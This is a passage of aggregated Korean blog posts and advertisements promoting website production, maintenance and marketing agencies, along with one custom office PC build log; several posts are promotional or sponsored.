않아도해당 브랜드, 기업의 서비스나 제품의품질에 대해서 어느정도는 파악할 수 있게 되었고,사람들은 점점 전화나 방문 상담보다는온라인을 활용한 정보 수집에익숙해지게 되었습니다.​​​   ​​​저희는 업체와 그들이제공하는 서비스, 제품에 대한철저한 분석과 파악을 기반으로 하여,해당 업체에 대한 브랜딩과 이미지 메이킹,아이덴티티의 확립이라는 아주 기초적인 첫 단계부터 로고 제작을 거쳐 홈페이지, 블로그 제작,운영, 바이럴,SNS 마케팅까지체계적인 커리큘럼을 통해 업체에 대한소비자들의 인식과 긍정적인 이미지가자리잡을 수 있도록 도와드립니다.​주 이용자층과 업체의 이미지에 맞는홈페이지, 블로그를 제작해드리고,그 운영과 관리까지 책임지는전문적인 대전홈페이지관리업체입니다.​​​   ​​​웹사이트라고도 불리는 홈페이지는예전에는 개인적인 사이트의 형식으로만들어지는 추세였으나,인터넷이 광고와 홍보의 수단으로 사용되는현재는 정보 제공 서비스, 실질적인제품의 구매, 홍보, 광고의 성격을 띈홈페이지가 많아지고 있습니다.​업체 내부에서 직접 제작하고운영하는 경우도 있지만비전문가가 홈페이지를 원하는 수준의퀄리티로 만드는 것은 어려운 것이현실이기 때문에, 믿을 수 있는대전홈페이지관리업체에웹사이트의 제작을 맡기는 방법을선택하는 사장님들이 많습니다.​​​   ​​​보다 저비용 고효율의 홈페이지 제작을 위해서다양한 종류의 템플릿을 활용하고 있으며,의뢰주신 업체에 맞는 레이아웃과 디자인을제작하여 해당 홈페이지, 블로그를 방문한소비자가 첫눈에 긍정적인 인식과 신뢰감을가질 수 있도록 합니다.​검색을 통해 원하는 정보를 얻으려는목적이 있는 이용자가 아니라,불특정한 잠정고객들이 방문한다면그 홈페이지 혹은 블로그에더 머무르며 콘텐츠들을 읽어볼지,또는 되돌아가기 버튼을 클릭할지결정하는 데에 걸리는 시간은겨우 7초에 불과하다고 알려져 있습니다.​​​   ​​​나의 업체에 대한 소비자들의첫인상을 결정하는 단 7초라는 시간안에확 시선을 사로잡아 좋은 이미지를 심어주는디자인은 비전문가가 아니라,수많은 사례와 경험으로 검증된대전홈페이지관리업체 전문적인 곳에맡기시는 것이 좋습니다.​ 홈페이지는 기업의 명함과 같습니다.​​   ​​​홈페이지는 해당 업체의 간판이자 얼굴입니다.​인터넷을 통해서 정보를 수집하는 소비자들은전화 연결을 통한 직원의 목소리도,오프라인 매장의 출입구 인테리어도 아닌인터넷 웹사이트를 통해서 기업의 첫인상을결정하고 있습니다.​계약을 고려하고 있는외부 업체와의 첫 미팅 자리에서상대 직원이 본인의 명함이나 회사의포트폴리오 하나도 가지고 있지 않다면,사장님은 어떤 생각을 하시겠습니까?​​​   ​​​기억에 남지 않는 것은 물론,해당 업체에 눈길을 주기도,그 업체와 계약을 하기도 힘들어집니다.소비자의 눈길을 받기도 힘들어지겠죠.​ 그렇다면 이렇게 중요한 웹사이트의제작비용은 얼마를 생각해야 할까요?안타깝게도 견적이 나오지 않은 상태에서홈페이지의 제작 비용은 정말 천차만별입니다.제작 방식에 있어서부터 의뢰인께서원하는 레이아웃으로 디자인을 처음부터맞춤형으로 제작하는 방법도 있으며,기존에 가지고 있는 템플릿을 선택하여업체의 이미지에 맞도록 수정과 보완을 거쳐사용하는 방법도 있습니다.​​​   ​​​또한 PC환경과 모바일 환경 모두에유연하게 반응하는 반응형 홈페이지 등여러가지 옵션 추가가 가능하기 때문에그 비용은 정확하게 어느 정도라고말씀드리기가 어렵습니다.​물론, 맞춤형으로 디자인을 처음부터짜는 방식보다는 템플릿을 이용한 방식이저렴한 것은 사실입니다. 그러나 디자인을직접 구성하셨을 때의 결과물이 템플릿을사용하셨을 때의 결과물보다 더 낫다는 보장은없습니다. 대전홈페이지관리업체의 경험과역량에 많은 영향을 받는 것이 디자인이기 때문입니다.​일부러 비용을 투자하여 의뢰하고 받아본 결과물이업체의 이미지에 맞지 않거나 시대의 흐름에뒤떨어진다면 해당 웹사이트를 방문한잠재적 소비자, 이용자들에게 호감을 사는 것이 더욱 어려워집니다. ​​​   ​​​그렇기 때문에업체를 선정하실 때에는 합리적인 비용에많은 사례를 가지고 있고, 트렌디하고 세련된디자인을 제작할 수 있는 충분한 역량을 가지고 있는곳으로 잘 선택하시는 것이 중요합니다.​이유커뮤니케이션은 홈페이지 제작 시무엇보다도 의뢰인과의 소통을 중시합니다.펜션, 제조업, 애견, 학원, it, 사회복지, 병원 등여러가지 분야의 웹사이트 제작 사례들로업체에 맞는 이미지를 제시해드리며,​클라이언트와의 맞춤 상담자 지정으로끊임없는 컨셉 회의와 상담, 신속한피드백을 보장해드리고 있습니다.​​​   ​​​이러한 소통은 단순히 의견을 주고받는것이 아니기 때문에 저희는 클라이언트 분들께서'그냥 알아서 잘 해달라'고의뢰를주시면 상당히 난처할 수 밖에 없습니다.​합리적인 비용에 클라이언트의 의도를 넘어서 행간을 읽고200퍼센트의 만족을 전달해 드릴 수 있는결과물을 제작하는 것이 목표입니다.​커뮤니케이션을 통해 이루어낼 수 있는시너지를 이용하여 보다 더 차별화된디자인과 마케팅 전략으로수많은 경쟁업체를 사이에서소비자의 눈길을 잡아끌 수 있도록 돕습니다.​​​   ​​​이유커뮤니케이션은6년간 여러 회사와 함께 진행해온 수많은 사례들그로 인해 축척된 경험들과 노하우를 기반으로최상의 결과물을 제공해드리기 위해최선을 다합니다. ​뿐만 아니라, 제작에 이어서사후에 홈페이지를 이용하시면서수정이나 보완이 이루어져야 하는부분들에 대해서도 협의 후 책임지고관리해드리고 있으며, ​바이럴마케팅, 콘텐츠의업로드, SNS 마케팅 등 다양한 마케팅 솔루션까지제공해드리는 원스톱 커리큘럼을 진행하고있기 때문에 자신있게 추천드릴 수 있습니다.​감사합니다.​​​​  사진을 누르면 홈페이지로연결됩니다.  모바일클릭시 전화연결됩니다. ​ 네이버 블로그는 맞지만, 확인불가옥션부분에서 관리를 맡고나서 매출이 3배이상 향상되었다.또한 광고사용 수수료가 매월 지출되는 백분률에서도 제일 적다.판매 성수기도 영향이 있겠지만 꾸준한 통계/분석과 그에 맞는 벤치마킹과 신속한 대응에서 온 결과도 많은 영향을 미쳤다고 볼수 있다.매출이 많이 향상되었으므로 좀 더 적극적이고 공격적으로 진행해 볼필요가있다. 중요한것은 그때그때의 변화되거나 변형된 사항을 기재하고 정리해야한다는 것이 많은 경험과 매출증대에 대한 명확한 길을 정할 수 있게 되는것같다.[셀러온 홈페이지 보러가기]​ 사람과 처음 만난다고 했을 때첫인상이 매우 중요한 부분을 차지하는 만큼기업과 고객의 첫만남도 중요하다고 할 수 있습니다.고객과 만남의 접점이 될 수 있는홈페이지에 대해서 이야기를 해보려고 합니다.​사람들은 원하는 정보를 얻기 위해서홈페이지를 통해 정보를 획득함과 동시에다양한 활동을 하고 있습니다.이에 기업의 입장에서는 개인 홈페이지를 통해서자사의 제품을 홍보하기도 하며고객들에게 PR을 할 수가 있습니다.​사업의 규모와 상관이 없이홈페이지를 운영하는 것은 필수적인 요소이기도 합니다.해당 브랜드에 대한 홈페이지를 접할 수 없다면고객에게 신뢰를 얻기가 힘들기 때문입니다.​ 소비자들은 전자 상거래를 하려고 할 때에도브랜드의 홈페이지에서 직접 구매하는 것을신뢰하면서도 선호하고 있습니다.또한 업체와 직접적으로 소통을 하고 싶을 때에도홈페이지를 직접 찾아 들어가기 때문에이를 제대로 구축해놓아야 하는 것입니다.​대구홈페이지제작을 원하시는 분들을 위해좀 더 자세하게 도움을 드리려고 합니다.요즘 새로운 사업 아이템을 가지고창업을 하시는 분들이 많아지고 있습니다.​언제까지나 회사를 다니는 것도안정적이지가 않기 때문에본인이 하고 싶은 일을 직접 하면서사업체를 가지는 것에 대한 꿈을 실현하는 것입니다.​ 창업할 때 여러 가지 중요한 요소들이 있지만디자인 요소들을 빼놓을 수는 없습니다.이러한 디자인을 가장 잘 나타낼 수 있는 것이대구홈페이지제작이라고 할 수 있습니다.웹사이트가 가지고 있는 힘이 매우 크기 때문에신뢰를 점차 쌓아서 견고하게 다지기 위해서는필수적인 요소로 고려해야 하는 것입니다.​비지니스가 성장하기 위해서는여러 가지 마케팅 전략을 수립해야 하고그중에 하나가 홈페이지 디자인 관리라고 할 수 있습니다.고객들이 정보를 얻을 때에도디자인이 잘 갖춰져 있어야효율적으로 정보를 가져갈 수 있기 때문입니다.​ 메인 화면은 소비자와 만나는 첫 단계이므로다음 단계로 이어지기 위한 첫걸음입니다.디자인적인 요소를 통해 홈페이지가 만들어져야눈에 띄면서도 브랜드의 이미지를효과적으로 전달할 수 있을 것입니다.​대구홈페이지제작은 단순히 정보 제공의 목적보다마케팅의 목적이 더 크다고 할 수 있습니다.노출을 통해 홍보 효과를 얻고이를 통해 소비자의 구매로 이어지도록 만들게 됩니다.​새로운 고객이 더 많이 유입될 수 있도록PC 환경뿐만 아니라 모바일이나 태블릿까지다양한 기기를 연동시킬 수 있어야 합니다.각 환경에 맞게 홈페이지가 구성이 되어야고객들이 더 쉽고 간편하게 접근할 수 있는 것입니다.​ 고객층을 확실하게 확보하기 위해서는대구홈페이지제작 업체인 보폭을 이용하실 수 있습니다.전문적으로 홈페이지를 제작하고 있기 때문에브랜드 이미지에 맞춰서 디자인 구성이 가능합니다.​어떻게 기획하고 제작하는지에 따라서퀄리티가 크게 달라질 수 있습니다.개발하는 기술은 누구나 배워서 적용시킬 수 있지만노하우는 무시할 수 없는 부분입니다.​보폭의 풍부한 포트폴리오를 접하고 나면대구홈페이지제작을 왜 보폭에서 진행해야 하는지이해하실 수 있으실 것입니다.기업과 홍보 방안을 함께 구상하고 있기 때문에믿고 진행하실 수 있을 것입니다.​ 다양한 디자인 설계가 가능하며콘텐츠 전략과 기획까지 제공해드리고 있어홈페이지제작에 큰 도움을 받으실 수 있습니다.​홈페이지를 통해서 기업의 비전을 제시하고가치관을 효율적으로 전달할 수 있을 것입니다.이에 방문자들의 구매까지 이끌어낼 수 있어서이윤을 창출할 수 있다는 장점이 있습니다.​자영업자들에게도 홈페이지의 중요성은더욱 커지고 있습니다.소비자들은 해당 기업이나 제품에 대해서잘 알아보지 않고 구매를 하지는 않습니다.제대로된 정보를 얻을 수 있고 신뢰가 기반이 되어야매출로 이어질 수 있는 것입니다.​ 수많은 홈페이지를 제작해오면서이에 대한 노하우를 보유하고 있고무한한 아이디어와 가능성을 가지고 있습니다.실력으로 증명을 하고 있기 때문에기업 이미지를 상승시킴과 동시에인지도까지 얻을 수 있을 것입니다.​마케팅 효과를 이끌어낼 수 있는 방법을적극적으로 활용한다면기업이 크게 성장해나가는 발판이 마련될 것입니다.​하단 위치첨부 대구광역시 수성구 동대구로9 401호(보폭)​보폭채널http://pf.kakao.com/_xbsdxgK​채팅상담http://pf.kakao.com/_xbsdxgK/chat​홈페이지 보폭검색광고, 바이럴광고, SNS광고, 영상제작, 디자인, 홈페이지제작astep-ad.com ​  제가 한때 꿈이 쇼핑몰 운영을 하는거였어요!이 꿈 얘기를 하자면 한 10여년 전으로 거슬러 올라가야해요..(앗..내 나이 뽀롱날까 ㅋㅋㅋ)처음 사회생활을 할때, 직장이 쇼핑몰 관련 업종에서 일을 했었거든요.그렇다고 직접 쇼핑몰 운영하는건아였고, 소호몰이라고 그 당시 ..10여년전 상당히 유형을 했던 일종에 쇼핑몰 입점 스시템이였어요.지금으로 보면 개인 쇼핑몰이라고 보시면 되어요... 지금이나 오픈마켓, 개인쇼핑몰 등등 굉장히 활성화 되고누구나가 맘만 먹으면 인터넷으로 장사를 할 수가 있죠!잡자기 왠 꿈얘기 쇼핑몰 얘기인가 하셨죠? ^^오늘 포스팅 할 내용이 바로 홈페이지나 쇼핑몰 관리대행을 관리를 잘해주는 가비아 솔루션에 대해서 말씀드리고 싶어서에요.그래서 이에 대해서 리뷰 할 기회가 생겨서 예전을 돌이켜보며 , 요즘 참 많이 바뀌었구나 싶기도 하고 장점들이 많더라구요.이제 간편하고 쉽게 홈페이지등을 수정할 수 있는 가비아 통합패키지에 대해서 설명 드릴께요.  홈페이지나 쇼핑몰을 운영을 하려고 한다면, 여러가지 인원이 필요로 합니다.기본적으로 웹디자인, 웹프로그래머, 쇼핑몰일 경우 사진 찍으시는분 모델 등등이러한 모든 일을 혼자 할 수는 없겠죠.모두 다 전문 관련 업무기 떄문에 어느정도 배워야 할 수 있는 일입니다. 그런데 이런한 홈페이지제작 관련된 모든 일을 가이아에서는 쉽고 빠르게 처리를 해주는 시스템이 구비되어 있습니다.처음 진행단계부터 제작 등 디자인 수정요청 부분이 있다고하면, 그러한 수정 요청작업을 바로 반영을 해주는 시스템입니다.  기본 사이트 템블랫 입니다.업종과 내가 원하는 디자인에 맞게 선택이 가능하죠.또한 배너 이미지나 문구 등 원하는데로 수정요청을 진행해서 관리대행을 의뢰 요청할 수 있는 시스템입니다.   구체적으로 수정사항을 요청하시면 됩니다.사이트의 분위기와 색감으로 요청을 하셔도 되고, 문구 등 요청하실 수 있습니다.만약, 그러한 대행관리 서비스가 없다면 웹다지인어분을 통해 작업을 해야되겠죠..?그러나 내가 직접 할 수는 없어도 이러한 서비스를 통해 사이트를 운영할 수 있다는게 가장 최대의 장점이라고 볼 수 있어요.    요청접수가 되면 작업상태에 표시가 되며, 보통 하루정도면 수정이 되더라구요.그제 요청하고 어제 또다시 요청을 했답니다.수정 전후 홈페이지를 올려드려야 하는데, 지금 이시간에도 아직 수정중이네요.내일 오전쯤 되겠죠?  가장 좋았던 가비아 관리대행의 특장점이였고요이 뿐만 아니라 사이트를운영을 하시려면 도메인, 호스팅 등도 필요하지요!이것또한 가비아에서 유지보사와 함께 모두 다 함께 제공이 된답니다.그래서 웹다지인이나, 프로그래밍 등 개발 지식이 없는 분들도 쉽게 홈페이지를 관리하실 수 있어요.또한, 이렇게 유지보수가 빨리 수정되고 처리되는건 유지보수 전담팀이 별도로 구성이 되어있어서이기도 해요.온라인 사이트 특징상, 수정 속도가 굉장히 중요하거든요.이번에 간단하게 가비아를 통해서 이것저것  만져도 보고 시스템도 확인하고 좋은경험 이였던거 같아요.홈페이지나 쇼핑몰 운영을 생각하고 계시는 분이시라면 쉽고 간단해서 누구나가 손쉽게 관리되는 관리대행 측면에서 좋을듯 싶습니다.   이 글은 홈페이지 관리대행 서비스를 소개하면서 가비아로부터 경제적 대가를 지원받아 작성한 포스팅 입니다.안녕하세요.부동산에 기술을 더하는 사람들부미녀 입니다.​최근 부기사 홈페이지 제작의뢰에아파트 단지 분양권, 또는 지식산업센터분양, 임대, 매매 홈페이지 제작 의뢰가많이 들어옵니다!​요럴때 예쁘고 깔끔하고효과적으로 홈페이지를 관리하실 수 있는 방법알려드리겠습니다!​단지를 깔끔하게 묶을 수 있는단지 정보관리!​ 매물관리>단지정보관리​ 단지 정보를 등록 하실 수 있습니다.단지 정보를 등록 하시면 매물 등록시 해당 단지의 매물들을 분류하실 수 있습니다.​ 매물등록시 단지 정보를 클릭하시면동일 단지 매물로 묶으실 수 있습니다.​단지 정보 관리를 클릭하시면​ ​해당 단지 매물만 묶어서 보시기 가능합니다!​​#부동산홈페이지제작 상담 문의는 오픈카톡 https://open.kakao.com/o/s9OyyLJc 부기사 오픈상담톡open.kakao.com ​​또는 아래 연락처로 연락주세요070-8098-8054​더 많은 정보가 궁금하시다면 부기사 홈페이지를 방문해주세요.https://bugisa.com 부기사 - 부동산에 기술을 더하는 사람들지도기반 부동산 홈페이지 제작, 3D VR 촬영, 부동산 매물관리, 부동산 홍보, 해외부동산 중개는 부기사bugisa.com ​​​​​ 홈페이지 관리 및 사무용 조립컴퓨터안녕하세요^^대구 전자관 조립컴퓨터 전문 아이엠 네트웍스입니다.오늘의 아이엠은 홈페이지 관리 및 판매 운영하시는 고객님을 위한 조립컴퓨터를 준비해드렸습니다.홈페이지 운영 및 관리 용도로 인터넷 창을 여러 개 띄워서 사용하기에 CPU는 i5 프로세서로 구성해 드렸습니다.다중 작업이 많은 경우 i5 이상을 하시면 더욱더 좋습니다.SSD를 추가해서 속도를 높여주고 부족한 저장공간을 하드디스크를 추가로 장착해 문서 및 사진 등다양한 자료를 저장할 수 있게끔 해드렸습니다.저희 아이엠에서는 고객님의 피씨 안정성을 위해 매번 정격 파워를 권장해드리고추천해드리고 있습니다.  ​​​​​​​​​​​ CPU : 인텔 코어 i5-6세대 스카이레이크 6600인텔  i5-6600은 쿼드코어(4-way 다중처리 프로세싱)으로작동 속도 3.9GHz 터보 속도 3.9GHz로 빠른 속도 처리를 자랑합니다.다중 작업에는 i5 이상의 프로세서를 추천해드립니다.​ 메모리 : 삼성전자 8G DDR4 17000 SAMSUNG삼성전자의 DDR4 8기가 제품입니다.메모리 용량은 넉넉하게 구성하시면 더욱 좋습니다.DDR3 보다 33% 이상 빠른 속도를 자랑하며 다중 스레드 작업의 효율성을 향상시켰으며낮은 전력소비와 높은 대역폭을 자랑합니다. 메인보드 : 기가바이트 GA-B150-D3H 듀러블에디션기가바이트 B150M-D3H 메인보드는국내 유일 32Gb/s M.2슬롯 지원 크로 스파이어, 인텔 랜, DDR4 풀 뱅크 슬롯을 지원합니다.5-페이즈 파워팩,  인텔 기가 비트 랜 16Gb/s SATA Express 지원인텔 스카이레이크는 역시 기가바이트입니다.​그래픽 : 이엠텍 XENON GTX 750Ti 2G D5 STORMX DUAL OC첫 구성품에 1G 제품으로 잘못 준비해  GTX 750Ti 2기가로 교체 진행해드렸습니다.EMTEK 750Ti 제품은 60w의 소비전력으로 보조 전원 연결이 필요 없는 그래픽카드입니다.현존하는 최신 게임은 물론 앞으로 나올 수많은 4k 해상도 지원 게임들을 대비할 수 있는 그래픽카드입니다.최대 3대의 모니터를 지원합니다. 파워서플라이 : FSP HEXA+ 500W정격 500W Active PFC(역률 99%)ADDA 120mm 팬을 적용하여 저소음, 빠른 쿨링 기능을 강화하였습니다.최대 효율 85%의 전력 소비 최소화 기능으로 어떤 작업이든 오랜 시간 안심하고 사용할 수 있습니다.​SSD : 삼성전자 850 PRO MZ-7KE256B/KR 256GB삼성 SSD는 3D V-NAND 기술, 더욱 길어진 수명의 SSD로 읽기 550MB/sec 쓰기 520MB/sec빠른 속도를 자랑합니다.​HDD : 도시바 1TB 7200RPM 32MB DT01ACA100도시바 하드는 7,200RPM으로 빠른 처리 속도를 적용하며빠른 데이터 처리를 위해 64MB 캐시 버퍼로 설계되었습니다.​ ODD : 삼성전자 DVD MULTI SH-224GB모든 OS에 호환되며 데이터 저장공간이 부족할 경우 많이 사용 가능한 제품입니다.​케이스 : 유한하이테크 ZEST K3 4USB의 케이스인 경우 전면 USB 3.0 *2 , USB2.0*2로 넉넉하게 USB 포트가 사용 가능합니다.​​​​​​​​​​​​​​​ ⊙ 인텔 정품 i5-6600을 준비합니다.​ ⊙ 기가바이트 메인보드를 준비합니다.​ ⊙ CPU 장착을 위해 CPU 소켓 덮개를 열어줍니다.​ ⊙ 메인보드에 CPU를 장착합니다.​ ⊙ CPU 장착 후 걸쇠 걸이로 고정시켜줍니다.​ ⊙ CPU 쿨러를 장착합니다.​ ⊙ CPU 쿨러 케이블을 메인보드에 연결해줍니다.​ ⊙ 메인보드에 메모리를 장착해줍니다.​ ⊙ 메인보드 세트가 준비되었습니다.​ ⊙ 조립할 케이스를 준비합니다.​ ⊙ 케이스 후면부에 메인보드 백 패널을 고정시켜줍니다.​ ⊙ 메인보드를 케이스에 고정시켜줍니다.​ ⊙ 메인보드 고정 후 후면부 백 패널 포트 쪽을 한 번 더 확인해줍니다.​ ⊙ 파워서플라이 장착 후 나사로 고정시켜줍니다.​ ⊙ 메인보드에 케이블을 연결해줍니다.⊙ 메인보드에 파워서플라이 전원 케이블을 연결해줍니다.​​​​​​​​​​⊙ SSD&HDD를 장착해줍니다.​​ ⊙ 그래픽 카드를 장착해줍니다.​ ⊙ 그래픽 장착 후 후면 포트도 한번 확인해줍니다.​ ⊙ 케이스 전면부에 ODD 장착할 위치에 커버를 제거합니다.​ ⊙ 삼성 디브이디 멀티를 장착해줍니다.​ ⊙ 케이스 내부에 선을 쿨러에 닿지 않게 깔끔하 정리해줍니다.​ ⊙ 장착된 디브이디 멀티도 확인해줍니다.​⊙ 조립이 완성되었습니다.이번 조립컴퓨터는 고객님께서 직접 견적서를 넣어주셔서기존에 사용하시던 컴퓨터와 동일하게 제작해드렸습니다.저희 아이엠 네트웍스에서는 다양하게 조립컴퓨터를 제작해드리고 있습니다.고객 한 분 한 분을 위해 꼼꼼하게 제작해드리겠습니다.조립컴퓨터에 궁금하신 사항이 있으시면 언제든지 연락 주세요!문자, 카카오톡으로도 문의하셔도 됩니다. 쇼핑몰디자인 관리/홈페이지 디자인 관리/상세페이지 디자인요즘 회사마다 홈페이지나 쇼핑몰을 운영하는 업체가 대다수라웹디자이너분들이 한분씩 계시죠?  홈페이지 관리도 해야하고 쇼핑몰 신제품도 업데이트도 해야하고..요즘같은 불경기에 하지만 인건비 비용때문에 걱정이 많으시죠홈페이지 배너나 이미지 하나 바꿔야 하는데, 쇼핑몰 간단한 상세페이지 올려야하는데메일링 디자인 해야하는데.. 등등 할일이 많지만 상주하는 직원을 두기에는 어려운 업체들도 많으리라 생각합니다.프리랜서로 재택근무하고 요청시 방문도 가능하구요. 월 저렴한 비용에 홈페이지 관리 업데이트 디자인 등 관리해 드립니다.현재 지역인터넷신문, 쇼핑몰, 일반회사홈페이지 등 월단위로 저렴하게 관리해 드리고 있습니다.부담갖지마시고 비용문의 연락주세요.sjdj11@naver.com 010-9445-0702회   ​블로그 홈페이지 관리, 어떻게 하고 계시나요?​​블로그 홈페이지란 기존 블로그의 레이아웃과 달리 기업 또는 브랜드와 맞게,홈페이지 형식의 블로그를 제작한 것을의미합니다.​블로그 홈페이지로 접근성을 더 높일 수 있지만막상 관리를 하면 블로그와 마케팅에 대해 전문가가 아닌 이상은 생각보다 어렵습니다.​아침을 담다의블로그 홈페이지 관리 필요성​브랜드의 이미지에 걸맞은 스킨과 타이틀그리고 자유로운 카테고리 위젯의 형식으로더욱 뛰어난 접근성을 가진 블로그로 리뉴얼 합니다.​블로그 관리뿐만 아니라1일 1포스팅 (월 30회)2일 1포스팅 (월 15회)등의 꾸준한 포스팅 서비스로 홈페이지에 대한 접근성을 높여줍니다.​홈페이지 6개월 이상 관리 시블로그 홈페이지 무료 제작 1년 계약 시 1개월 추가 관리 서비스아침을 담다의 장기 관리 플랜도 만나보세요​블로그 홈페이지의 적합한 업종전문 직종, 병원, 학원 등​아침을 담다는업종과 상황을 고려하여고객사에 맞는 마케팅을 컨설팅합니다.​​   ​ 네이버 블로그는 맞지만, 확인불가홈페이지 유지보수 전문 웹수리입니다. 저희는 학교, 신문사, 교회, 개인회사등 매달 관리를 해드리고 있습니다.홈페이지는 유지보수가 너무 중요합니다.마음에 맞는 관리가 될수 있게최선을 다하고 있습니다.저가형부터 고급형까지 일의 양에따라 금액이 결정됩니다.지금 한번 문의 해보세요..www.websuri.com 02-2244-7587  홈페이지가 제작되고 나면 이제부터는 관리해야 합니다.홈페이지 관리라고 하면 참 막연할텐데요.어떤 것들을 관리해야 하는 지 요소를 나열해 설명드리겠습니다.   1. 관리 용역은 누가 담당할지 결정해야 합니다.​홈페이지는 html언어로 만들어져 있습니다.html은 규약인데요. 영문 문자의 조합을 되어 있습니다.때문에 전화번호 하나를 바꿔도 html파일을 열어 어느 부분을 바꿔야 하는지 당황스럽습니다.​하지만 html언어가 그렇게 높은 장벽은 아닙니다.홈페이지 디자인에 관심이 있으시다면 관련 책을 구입해 조금만 연습해 보시면 아주 간단한 것들은 처리하실 수 있습니다.복잡하고 난이도가 높은 것들은 여전히 전문가의 몫이지만 말입니다.   2. 관리용역을 아웃소싱 하신다면 홈페이지 관리 전문업체에 맡기세요.​홈페이지 관련 업무를 한다고 모두 홈페이지 관리업체는 아닙니다.대부분 주 업무는 홈페이지 제작인 업체가 대부분입니다.홈페이지제작인 업체에 관리를 맡기면 피드백을 장담할 수 없습니다.한가할 때는 신속성을 보이다가 제작업무가 바쁘면 관리 업무는 뒷전이 될 수 밖에 없습니다.​업력이 좀 된 업체 가운데 홈페이지관리가 전문인 업체를 수배해보세요.자사와 지리적으로 근접한 업체를 찾을 이유는 하나도 없습니다. 모든 일이 인터넷을 통해 이루어지니까요.관리업무는 무엇보다 피드백이 중요합니다.   3. 홈페이지 관련 정보는 메모하셔야 합니다.​많은 홈페이지 관리자들에게 웹호스팅사가 어디인지 물으면 모르고 답변하십니다.홈페이지제작이 완료되는 순간 홈페이지의 실체를 확인하고는 거기서 그만입니다.홈페이지는 24시간 작동하는 서버에서 웹서비스를 할 수 있습니다.이런 시설을 갖춘 웹호스팅사 서버에 자사 홈페이지는 공간을 할당받아 웹서비스를 하게 되는데요.   통상 홈페이지를 만들 때 웹호스팅사 선정을 제작사에 위임합니다.제작이 완료된 홈페이지는 웹호스팅사 정보와 함께 납품이 되어야 합니다.웹호스팅 정보란 호스팅사 url, 아이디, 비밀번호, 호스팅비 납부방법 등 입니다.​아울러 도메인 네임 등록도 제작사에 맡긴 경우 똑같이 관련 정보를 넘겨받으셔야 합니다.도메인 유지비는 통상 1년에 한번 납무하셔야 합니다.   ​ 안녕하세요. 푸우입니다.날씨가 점점 더워지고 있습니다.몇일 비가 와서 조금 추웠지만본격적인 여름이 시작이 되는거 같아요.예전같으면 이곳저곳여행을 다니기도 하고 여름 휴가 계획을 세우기도 했을텐데요.지금은 코로나로 조심스럽습니다. 주말이 지나면 확진자 수가 조금씩 늘어나는 것을 볼수 있습니다.전에는 휴가철이 다가오면펜션 사업하시는분들 정신없는 시간을 보낼텐데 지금은 너무나 힘든시기를 보내고 계시죠?그래서 직접 나설수 밖에 없습니다.그래서 손님이 늘어날수 있는 방법을찾아보게 되는데요.그것 중 하나가 지금의 곳의 모든 것을 온라인으로 보여주며 운영을 하는 방법이 있습니다.그것이 바로홈페이지제작을 하는 것입니다.저도 부모님께서 충남 태안에서 조그맣게 펜션을 하시는데입소문으로 알고 계신 손님들 위주로 운영을 하시다보니 올해 초부터 더욱 힘들어지셨어요.다들 어려운 시기라서 그러려니~ 지내셨는데다시 펜션을 열어야겠다고 생각하시고좀 더 많은 손님께 우리 펜션을 알릴 수 있는방법이 어디 없냐고 여쭤보시길래 지난번 지인이 시작한 인테리어 사업에서 경영에 도움이많이 되고있다는 홈페이지제작을 권유해 드렸어요. 만드는것에 너무 치중하다보면제 생각에도 어려운 시기인 만큼 금액적인 부담은 줄이는 게 좋다고 생각이 되었기 때문에인터넷 검색을 총동원해서 찾기 시작했습니다.말로만 고급스럽게 만들어준다고 하는 곳이 아닌제대로 결과물을 보여주는 곳을 찾고 싶었거든요.그리고 한 곳이 눈에 띄어서 집중적으로 보았습니다.프로그램 안에 들어가는 디자인이나 글귀도고급스럽고 깔끔한 느낌이 괜찮더라고요.사업하시는 분들이나 기업 위주로 포트폴리오가 많이 올라와 있길래 신뢰가 갔어요.아무래도 업체의 상품과 서비스를 알리고판매하고 매출까지 생각하는 부분이라면제대로 된 것이 있어야 한다고생각하는 1인이기 때문에 이곳으로 선택했습니다.무엇보다도 도메인 등록 권한도 자유롭고 소유할수 있다고 하였습니다.의뢰해서 돈을 주고 만들었는데내 소유가 되지 않는다면 무슨 소용일까요? 아마 저처럼 생각하시는 분들이 대부분일 것 같아요.홈페이지제작을 진행한 후에도 마음 편하게 사용할 수 있다는 점입니다.물론 만드는 걸 맡기는 과정도 어렵지 않기 때문에우리에게 맡긴 보람을 느끼게 해주는 곳이었던 것 같아요.제가 부모님의 펜션 사이트를 만들기 위해선택한 전문 업체는 다한웹이라는 곳이랍니다.어릴 적부터 무엇이든 꼼꼼하게 알아보는 성격인저이기에 부모님께서도 흔쾌하게 OK 하셨고,마음에 드는 홈페이지와 관리를 받고 있기 때문에혹시 필요하신 분들이 있을까 해서 정보 남깁니다!전문적으로 만들어주는 분들이 있는 곳을선택하고 싶었기때문에 꼼꼼하게 알아보았고,디자인은 물론 기술적인 분야도 잘 봐주시는전문가분들이 있는 곳이라고 해서 믿음이 갔습니다.부모님과 저는 이런 분야는 하나도 모르는 상태라서여기저기 시간 낭비하지 않고 한 업체 안에서 모든 것을 다 할 수 있게끔 맡기고 싶었어요.이곳에 맡기고 나서 시간상으로 여유가 생겼고오히려 절약한 느낌이었는데요. 평소 같으면 펜션을 알린답시고 제가 간단한 SNS만 올렸을 텐데개인적으로 하는 것보다는 사이트가 있고 없고차이가 정말 큰 것 같습니다. 어떠한 느낌으로 원하는지 상담을 진행하였고일정에 척척 맞춰서 필요한 정보들을 이 안에 넣으시는 걸 보니 전문가는 다르구나~ 생각되었어요.펜션 하시는 분들이라면 홈페이지는 필수라고생각이 되는데요. 아무래도 옛날처럼 전단지를돌리면서 알리기도 쉽지도 않고,개인적으로 SNS를 한다고 하더라도체계적인 느낌이 없기 때문에 손님을 끌기에는어려움이 따를 수 있고 시간적인 부분도 여유가 없는데제작 진행을 하다 보면 척척 해결되는 느낌이라서마음 편하게 기다리고 있을 수 있더라고요.일단 만들고 나서 나중에 케어를 어떻게 하나장기적으로 걱정을 하고 있었는데요.유지보수가 가능한 곳이라고 해서 다행이었어요.전화번호를 바꾼다거나 계절적인 느낌에포인트를 주고 싶다거나 할 때는 수정을 요청하면그때 바로 가능하다고 하니 안심이 되더라고요!PC 컴퓨터뿐만 아니라 모바일 홈페이지도같이 만나볼 수 있어서 만족스러운 것 같습니다.요즘은 컴퓨터보다는 노트북이나 태블릿을 많이사용하는 편이고 스마트폰은 거의 기본이잖아요.스마트폰으로 검색을 하고 놀러 오시는 분들이 많은데모바일 사이트도 무료라는 합니다.사실 저희 부모님께서는 온라인과는 별로친하지가 않으시기 때문에 입소문으로만단골분들이 놀러 오는 펜션을 운영하셨었는데요. 오프라인으로만 운영을 해오던 펜션이온라인에 올라간다고 생각하니 